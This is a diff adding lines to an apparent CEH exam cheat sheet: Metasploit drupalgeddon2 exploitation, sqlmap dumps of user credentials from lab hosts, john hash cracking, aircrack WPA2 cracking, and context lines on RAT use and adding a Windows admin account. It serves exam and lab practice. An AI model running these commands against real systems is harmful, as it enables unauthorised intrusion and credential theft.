@@ -49,6 +49,8 @@ Thief RAT -> File Manager -> Open folder -> Count files
 1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
 2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
 3- Image Stegnography using Openstego- PRACTICE ??
+4- shCopy code
+   john --format=Raw-MD5 --wordlist=rockyou.txt Hash2crack.txt
 ```
 #  Sniffing
 ```
@@ -89,6 +91,21 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
+6- http://www.cehorg.com/index.php?page_id=95
+7- msfconsole
+search drupalgeddon2
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOST 10.10.55.50
+set RPORT 80 # Ensure the port is correct for HTTP
+run
+find / -name Flag.txt 2>/dev/null
+cat /path/to/Flag.txt
+8- arduinoCopy code
+http://192.168.44.32:8080/DVWA/ECweb/Certified/
+8.1- shCopy code
+cat filename.txt | base64 --decode > decoded.txt
+8.2- powershellCopy code
+Get-Content filename.txt | ForEach-Object { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_)) } > decoded.txt
 ```
 #  SQL Injections
 ```
@@ -103,6 +120,19 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
+7.1 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" --dump
+7.2 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" --dbs
+7.3 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name --tables
+7.4 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users --columns
+7.5 sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="PHPSESSID=your_session_id" -D database_name -T users -C username,password --dump
+8.1 shCopy code
+    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs
+8.2 shCopy code
+    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name --tables
+8.3 shCopy code
+    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -T table_name --columns
+8.4 shCopy code
+    sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name -T table_name -C Flag --dump
 ```
 # Android
 ```
@@ -133,6 +163,9 @@ nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQ
 Cracking Wifi Password
 aircrack-ng [pcap file] (For cracking WEP network)
 aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
+airodump-ng W!F!_Pcap.cap
+airodump-ng --bssid BSSID --channel CHANNEL -w outputfile W!F!_Pcap.cap
+aircrack-ng -w /path/to/wordlist.txt outputfile-01.cap
 
 ```
 #  Some extra work 
